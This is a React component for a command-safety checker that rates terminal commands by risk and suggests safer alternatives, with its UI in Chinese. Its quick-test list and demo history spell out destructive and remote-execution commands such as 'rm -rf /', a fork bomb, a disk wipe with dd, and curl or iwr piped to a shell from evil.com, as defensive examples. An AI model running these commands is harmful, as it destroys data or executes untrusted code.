import React, { useState, useCallback } from 'react';
import {
  Shield,
  ShieldCheck,
  ShieldAlert,
  ShieldOff,
  Search,
  Copy,
  Check,
  Terminal,
  AlertTriangle,
  Clock,
  Trash2,
  ChevronRight,
  ChevronDown,
  Lightbulb,
  ArrowRight,
  RefreshCw,
  Zap,
  HardDrive,
  Globe,
} from 'lucide-react';
import { api } from '../lib/api';
import { checkCommandSafety } from '../lib/safetyRules';
import { SurfaceCard, EmptyState, Button, Textarea, Badge, RiskMeter } from '../components/';
import type { SafetyCheckResult, RiskLevel } from '../lib/types';
import { generateId, formatRelativeDate, copyToClipboard, classNames } from '../lib/utils';

// ── Predefined test commands ───────────────────────────────────────────────
const DANGEROUS_COMMANDS = [
  { label: 'rm -rf /', cmd: 'rm -rf / --no-preserve-root' },
  { label: 'iwr | iex', cmd: 'iwr https://evil.com/script.ps1 | iex' },
  { label: 'curl | bash', cmd: 'curl -s https://evil.com/install.sh | bash' },
  { label: ':(){ :|:& };:', cmd: ':(){ :|:& };:' },
  { label: 'dd if=/dev/zero', cmd: 'dd if=/dev/zero of=/dev/sda bs=1M' },
  { label: 'git push --force', cmd: 'git push --force origin main' },
];

const SAFE_COMMANDS = [
  { label: 'ls -la', cmd: 'ls -la' },
  { label: 'git status', cmd: 'git status' },
  { label: 'npm install', cmd: 'npm install react' },
  { label: 'echo hello', cmd: 'echo "Hello World"' },
];

// ── Demo history ───────────────────────────────────────────────────────────
const DEMO_HISTORY: SafetyCheckResult[] = [
  {
    id: 's1',
    command: 'rm -rf / --no-preserve-root',
    riskLevel: 'critical',
    matchedRules: [
      { name: '递归删除根目录', description: 'rm -rf / 会删除整个文件系统' },
      { name: '无确认标志', description: '未使用 -i 交互模式标志' },
    ],
    explanation: '此命令会递归删除系统根目录下的所有文件，导致系统完全损坏且不可恢复。',
    saferAlternative: '# 如果需要删除特定目录，请使用:\nrm -rf /path/to/specific/directory\n\n# 建议先列出将要删除的文件:\nfind /path/to/dir -type f | head -20',
    backupSuggested: true,
    isolationSuggested: true,
    checkedAt: new Date(Date.now() - 2 * 3600e3).toISOString(),
  },
  {
    id: 's2',
    command: 'iwr https://evil.com/script.ps1 | iex',
    riskLevel: 'high',
    matchedRules: [
      { name: '远程脚本执行', description: '从远程 URL 下载并立即执行 PowerShell 脚本' },
      { name: '管道到 iex', description: 'iex (Invoke-Expression) 会执行任意代码' },
    ],
    explanation: '从不可信的远程源下载脚本并直接执行，攻击者可通过该脚本完全控制系统。',
    saferAlternative: '# 1. 先下载脚本到本地:\niwr https://example.com/script.ps1 -OutFile ./script.ps1\n\n# 2. 查看脚本内容:\nGet-Content ./script.ps1\n\n# 3. 确认安全后再执行:\n./script.ps1',
    backupSuggested: false,
    isolationSuggested: true,
    checkedAt: new Date(Date.now() - 24 * 3600e3).toISOString(),
  },
  {
    id: 's3',
    command: 'npm install react',
    riskLevel: 'safe',
    matchedRules: [],
    explanation: '标准的 npm 包安装命令，风险较低。建议启用 package-lock.json 进行版本锁定。',
    saferAlternative: 'npm install react  # 当前命令已经安全',
    backupSuggested: false,
    isolationSuggested: false,
    checkedAt: new Date(Date.now() - 48 * 3600e3).toISOString(),
  },
];

// ── Component ──────────────────────────────────────────────────────────────
export default function SafetyBox() {
  const [command, setCommand] = useState('');
  const [analyzing, setAnalyzing] = useState(false);
  const [result, setResult] = useState<SafetyCheckResult | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [history, setHistory] = useState<SafetyCheckResult[]>(DEMO_HISTORY);
  const [expandedHistory, setExpandedHistory] = useState<Set<string>>(new Set());
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  // ── Run safety check ──────────────────────────────────────────────────
  const handleCheck = useCallback(async () => {
    if (!command.trim()) return;
    setAnalyzing(true);
    setError(null);
    setResult(null);

    try {
      await new Promise((r) => setTimeout(r, 500));

      let checkResult: SafetyCheckResult;
      try {
        checkResult = checkCommandSafety(command);
      } catch {
        // Fallback if safetyRules not available
        checkResult = {
          id: generateId(),
          command: command.trim(),
          riskLevel: 'safe' as RiskLevel,
          matchedRules: [],
          explanation: '未检测到已知风险模式。',
          saferAlternative: command.trim(),
          backupSuggested: false,
          isolationSuggested: false,
          checkedAt: new Date().toISOString(),
        };
      }

      setResult(checkResult);
      setHistory((prev) => [checkResult, ...prev].slice(0, 50));
    } catch (err: any) {
      setError(err?.message || '安全检查失败');
    } finally {
      setAnalyzing(false);
    }
  }, [command]);

  // ── Quick test ────────────────────────────────────────────────────────
  const handleQuickTest = (cmd: string) => {
    setCommand(cmd);
    // Auto-check after a brief delay so user sees the command
    setTimeout(() => {
      setCommand(cmd);
    }, 0);
  };

  // ── Copy helper ───────────────────────────────────────────────────────
  const handleCopy = async (text: string, key: string) => {
    await copyToClipboard(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  // ── Toggle history ────────────────────────────────────────────────────
  const toggleHistory = (id: string) => {
    setExpandedHistory((prev) => {
      const next = new Set(prev);
      next.has(id) ? next.delete(id) : next.add(id);
      return next;
    });
  };

  // ── Clear history ─────────────────────────────────────────────────────
  const clearHistory = () => setHistory([]);

  // ── Risk level config ─────────────────────────────────────────────────
  const riskConfig: Record<string, { icon: React.ComponentType<any>; color: string; bg: string; label: string }> = {
    safe: { icon: ShieldCheck, color: 'text-emerald-400', bg: 'bg-emerald-500/10 border-emerald-500/20', label: '安全' },
    low: { icon: Shield, color: 'text-blue-400', bg: 'bg-blue-500/10 border-blue-500/20', label: '低风险' },
    medium: { icon: ShieldAlert, color: 'text-amber-400', bg: 'bg-amber-500/10 border-amber-500/20', label: '中风险' },
    high: { icon: ShieldAlert, color: 'text-orange-400', bg: 'bg-orange-500/10 border-orange-500/20', label: '高风险' },
    critical: { icon: ShieldOff, color: 'text-red-400', bg: 'bg-red-500/10 border-red-500/20', label: '严重风险' },
  };
  const getRiskConfig = (level: RiskLevel) => riskConfig[level.toLowerCase()] ?? riskConfig.safe;
  const getRuleName = (rule: string | { name: string; description: string }) =>
    typeof rule === 'string' ? rule : rule.name;
  const getRuleDescription = (rule: string | { name: string; description: string }) =>
    typeof rule === 'string' ? '' : rule.description;

  // ── Render ──────────────────────────────────────────────────────────────
  return (
    <div className="max-w-5xl mx-auto px-6 py-8 space-y-6">
      {/* Header */}
      <div>
        <h1 className="text-3xl font-bold text-[var(--text-primary)] tracking-tight">安全沙箱</h1>
        <p className="text-[var(--text-muted)] text-sm mt-1">检查终端命令的安全性，防止危险操作</p>
      </div>

      {/* Command input */}
      <SurfaceCard className="p-5 space-y-4">
        <div className="flex items-center gap-2">
          <Shield className="w-4 h-4 text-emerald-400" />
          <h2 className="text-sm font-semibold text-[var(--text-secondary)]">输入命令</h2>
        </div>
        <Textarea
          value={command}
          onChange={(e) => setCommand(e.target.value)}
          placeholder="在此输入要检查的命令...&#10;&#10;例如:&#10;rm -rf /path/to/dir&#10;git push --force origin main"
          rows={4}
          disabled={analyzing}
        />
        <div className="flex items-center gap-3">
          <Button
            onClick={handleCheck}
            loading={analyzing}
            disabled={!command.trim()}
            icon={analyzing ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Search className="w-4 h-4" />}
          >
            检查安全
          </Button>
          {command && (
            <button
              onClick={() => { setCommand(''); setResult(null); }}
              className="text-xs text-[var(--text-primary)]0 hover:text-[var(--text-secondary)] transition-colors"
            >
              清空
            </button>
          )}
        </div>
      </SurfaceCard>

      {/* Quick test buttons */}
      <div className="space-y-3">
        <h3 className="text-xs font-semibold text-[var(--text-primary)]0 uppercase tracking-wider flex items-center gap-1.5">
          <Zap className="w-3 h-3 text-amber-400" />
          快速测试
        </h3>
        <div className="flex flex-wrap gap-2">
          <span className="text-[11px] text-[var(--text-muted)] self-center mr-1">危险命令:</span>
          {DANGEROUS_COMMANDS.map((tc) => (
            <button
              key={tc.label}
              onClick={() => { setCommand(tc.cmd); }}
              className="px-2.5 py-1.5 rounded-lg bg-red-500/10 border border-red-500/20 text-red-300 text-[11px]
                         hover:bg-red-500/20 transition-colors font-mono"
            >
              {tc.label}
            </button>
          ))}
        </div>
        <div className="flex flex-wrap gap-2">
          <span className="text-[11px] text-[var(--text-muted)] self-center mr-1">安全命令:</span>
          {SAFE_COMMANDS.map((tc) => (
            <button
              key={tc.label}
              onClick={() => { setCommand(tc.cmd); }}
              className="px-2.5 py-1.5 rounded-lg bg-emerald-500/10 border border-emerald-500/20 text-emerald-300 text-[11px]
                         hover:bg-emerald-500/20 transition-colors font-mono"
            >
              {tc.label}
            </button>
          ))}
        </div>
      </div>

      {/* Analyzing */}
      {analyzing && (
        <SurfaceCard className="p-12 text-center">
          <RefreshCw className="w-5 h-5 animate-spin text-emerald-400 mx-auto mb-3" />
          <p className="text-sm text-[var(--text-muted)]">正在分析命令安全性...</p>
        </SurfaceCard>
      )}

      {/* Error */}
      {error && (
        <SurfaceCard className="p-4 border-red-500/20 bg-red-500/5">
          <div className="flex items-center gap-2 text-red-400 text-sm">
            <AlertTriangle className="w-4 h-4" /> {error}
          </div>
        </SurfaceCard>
      )}

      {/* Result card */}
      {result && !analyzing && (
        <SurfaceCard className={classNames('p-6 space-y-5', getRiskConfig(result.riskLevel).bg)}>
          {/* Risk meter & summary */}
          <div className="flex items-start gap-4">
            <RiskMeter level={result.riskLevel} />
            <div className="flex-1">
              <div className="flex items-center gap-2 mb-1">
                {React.createElement(getRiskConfig(result.riskLevel).icon, {
                  className: `w-5 h-5 ${getRiskConfig(result.riskLevel).color}`,
                })}
                <Badge
                  className={
                    result.riskLevel === 'safe'
                      ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30'
                      : result.riskLevel === 'critical'
                      ? 'bg-red-500/20 text-red-300 border-red-500/30'
                      : 'bg-amber-500/20 text-amber-300 border-amber-500/30'
                  }
                >
                  风险等级: {getRiskConfig(result.riskLevel).label}
                </Badge>
              </div>
              <p className="text-sm text-[var(--text-secondary)]">{result.explanation}</p>
            </div>
          </div>

          {/* Matched rules */}
          {result.matchedRules.length > 0 && (
            <div>
              <h4 className="text-xs font-semibold text-[var(--text-muted)] uppercase tracking-wider mb-2">
                匹配的规则
              </h4>
              <div className="space-y-1.5">
                {result.matchedRules.map((rule, i) => (
                  <div key={i} className="flex items-start gap-2 p-2 rounded-lg bg-[var(--surface-muted)]">
                    <AlertTriangle className="w-3.5 h-3.5 text-amber-400 flex-shrink-0 mt-0.5" />
                    <div>
                      <p className="text-sm text-[var(--text-secondary)] font-medium">{getRuleName(rule)}</p>
                      {getRuleDescription(rule) && (
                        <p className="text-xs text-[var(--text-primary)]0">{getRuleDescription(rule)}</p>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Safer alternative */}
          <div>
            <h4 className="text-xs font-semibold text-[var(--text-muted)] uppercase tracking-wider flex items-center gap-1.5 mb-2">
              <Lightbulb className="w-3.5 h-3.5 text-emerald-400" />
              安全替代方案
            </h4>
            <div className="relative">
              <pre className="px-4 py-3 rounded-panel bg-[var(--surface-muted)] text-xs text-[var(--text-secondary)] font-mono whitespace-pre-wrap border border-[var(--border)]">
                {result.saferAlternative}
              </pre>
              <button
                onClick={() => handleCopy(result.saferAlternative, 'safer')}
                className="absolute top-2 right-2 p-1.5 rounded-lg hover:bg-[var(--surface-muted)] text-[var(--text-primary)]0 hover:text-[var(--text-secondary)] transition-colors"
              >
                {copiedKey === 'safer' ? (
                  <Check className="w-3.5 h-3.5 text-emerald-400" />
                ) : (
                  <Copy className="w-3.5 h-3.5" />
                )}
              </button>
            </div>
          </div>

          {/* Suggestions */}
          <div className="flex items-center gap-4 text-xs">
            {result.backupSuggested && (
              <span className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-amber-500/10 border border-amber-500/20 text-amber-300">
                <HardDrive className="w-3.5 h-3.5" />
                建议先备份数据
              </span>
            )}
            {result.isolationSuggested && (
              <span className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-blue-500/10 border border-blue-500/20 text-blue-300">
                <Shield className="w-3.5 h-3.5" />
                建议在隔离环境中执行
              </span>
            )}
          </div>

          {/* Original command */}
          <details className="border-t border-[var(--border)] pt-4">
            <summary className="text-xs text-[var(--text-primary)]0 cursor-pointer hover:text-[var(--text-muted)]">
              查看原始命令
            </summary>
            <pre className="mt-2 px-3 py-2 rounded-lg bg-[var(--surface-muted)] text-xs text-[var(--text-primary)]0 font-mono">
              {result.command}
            </pre>
          </details>

          {/* Timestamp */}
          <p className="text-[11px] text-[var(--text-muted)] text-right">
            检查时间: {formatRelativeDate(result.checkedAt)}
          </p>
        </SurfaceCard>
      )}

      {/* Empty state */}
      {!result && !analyzing && !error && (
        <SurfaceCard className="p-12">
          <EmptyState
            icon={Shield}
            title="准备安全检查"
            description="在上方输入终端命令，或点击快速测试按钮尝试预定义的危险/安全命令"
          />
        </SurfaceCard>
      )}

      {/* History */}
      <div className="space-y-3">
        <div className="flex items-center justify-between">
          <h2 className="text-lg font-semibold text-[var(--text-primary)] flex items-center gap-2">
            <Clock className="w-4 h-4 text-[var(--text-primary)]0" />
            检查历史
            <Badge className="bg-[var(--surface-muted)] text-[var(--text-muted)] border-[var(--border)]">
              {history.length}
            </Badge>
          </h2>
          {history.length > 0 && (
            <button
              onClick={clearHistory}
              className="text-xs text-[var(--text-muted)] hover:text-red-400 transition-colors flex items-center gap-1"
            >
              <Trash2 className="w-3 h-3" /> 清空历史
            </button>
          )}
        </div>

        {history.length > 0 ? (
          <div className="space-y-2">
            {history.map((h, index) => {
              const historyId = h.id ?? `history-${index}`;
              const cfg = getRiskConfig(h.riskLevel);
              const Icon = cfg.icon;
              return (
                <SurfaceCard key={historyId} className="p-4">
                  <button
                    onClick={() => toggleHistory(historyId)}
                    className="w-full flex items-center justify-between text-left"
                  >
                    <div className="flex items-center gap-2 min-w-0 flex-1">
                      <Icon className={`w-4 h-4 flex-shrink-0 ${cfg.color}`} />
                      <code className="text-sm text-[var(--text-secondary)] font-mono truncate">{h.command ?? ''}</code>
                    </div>
                    <div className="flex items-center gap-2 flex-shrink-0 ml-2">
                      <Badge className={cfg.bg}>
                        {cfg.label}
                      </Badge>
                      <span className="text-[11px] text-[var(--text-muted)]">
                        {formatRelativeDate(h.checkedAt)}
                      </span>
                      {expandedHistory.has(historyId) ? (
                        <ChevronDown className="w-4 h-4 text-[var(--text-primary)]0" />
                      ) : (
                        <ChevronRight className="w-4 h-4 text-[var(--text-primary)]0" />
                      )}
                    </div>
                  </button>

                  {expandedHistory.has(historyId) && (
                    <div className="mt-3 pt-3 border-t border-[var(--border)] space-y-2">
                      <p className="text-sm text-[var(--text-muted)]">{h.explanation}</p>
                      {h.matchedRules.length > 0 && (
                        <div className="flex flex-wrap gap-1">
                          {h.matchedRules.map((r, i) => (
                            <Badge key={i} className="bg-red-500/10 text-red-300 border-red-500/20 text-[10px]">
                              {getRuleName(r)}
                            </Badge>
                          ))}
                        </div>
                      )}
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          setCommand(h.command ?? '');
                          window.scrollTo({ top: 0, behavior: 'smooth' });
                        }}
                        className="text-xs text-blue-400 hover:text-blue-300 transition-colors"
                      >
                        重新检查此命令
                      </button>
                    </div>
                  )}
                </SurfaceCard>
              );
            })}
          </div>
        ) : (
          <SurfaceCard className="p-8">
            <EmptyState
              icon={Clock}
              title="暂无检查历史"
              description="检查命令后，历史记录将显示在这里"
            />
          </SurfaceCard>
        )}
      </div>
    </div>
  );
}
